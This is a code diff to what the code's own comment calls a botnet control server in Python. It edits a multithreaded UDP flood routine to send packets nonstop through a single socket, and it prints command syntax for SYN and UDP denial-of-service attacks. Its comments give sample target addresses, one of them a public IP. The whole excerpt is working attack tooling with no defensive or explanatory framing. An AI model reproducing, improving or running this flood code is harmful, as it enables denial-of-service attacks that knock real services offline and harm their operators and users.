@@ -227,23 +227,23 @@ class Server(Colours): # this class is create a server to control botnet
 
 
 		def _dos_attack_udp(destination_IP, destination_port, time:int):
-			#s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			bytes = random._urandom(3)  # random the size of udp packet .
-			#s.connect((destination_IP, int(destination_port)))
-			while self.run:
+			s.connect((destination_IP, int(destination_port)))
+			while True:
 				if not self.run: break
-				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-				s.connect((destination_IP, int(destination_port)))
+				#s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+				#s.connect((destination_IP, int(destination_port)))
 				s.sendto(bytes, (destination_IP, int(destination_port)))
-				sleep(2)
-			#s.close()
+
+			s.close()
 
 		help = "DoS with SYN Flood: attack dos syn <ip> <port> <time in second> <Thread>\n" + "DoS with UDP Flood: attack dos udp <ip> <port> <time in second> <Thread>\n"
 		print(help)
 		cmd = input("->>")
 		if "syn" in cmd:
 			#attack dos syn 27.64.57.85 1005 200 5000
-			#attack dos syn 192.168.1.48 443 200
+			#attack dos syn 192.168.1.48 443 200 5000
 			data = cmd.replace("attack dos syn ","").split(" ")
 			print(data)
 			ip, port, times, thread = data
@@ -255,6 +255,7 @@ class Server(Colours): # this class is create a server to control botnet
 			self.run = False
 		elif "udp" in cmd:
 			#attack dos udp 27.64.57.85 1005 200 5000
+			# attack dos udp 192.168.1.48 443 200 5000
 			data = cmd.replace("attack dos udp ", "").split(" ")
 			print(data)
 			ip, port, times, thread = data
@@ -264,9 +265,9 @@ class Server(Colours): # this class is create a server to control botnet
 			for a in range(int(thread)):
 				Thread(target=_dos_attack_udp, args= (ip, port, times)).start()
 				#print(threading.enumerate())
-			print(threading.active_count())
 			self.run = False
-
+			# Thread(target=_dos_attack_udp, args=(ip, port, times)).start()
+			# self.run = False
 
 
 		# destination_IP = input("Enter IP address of Target: ")
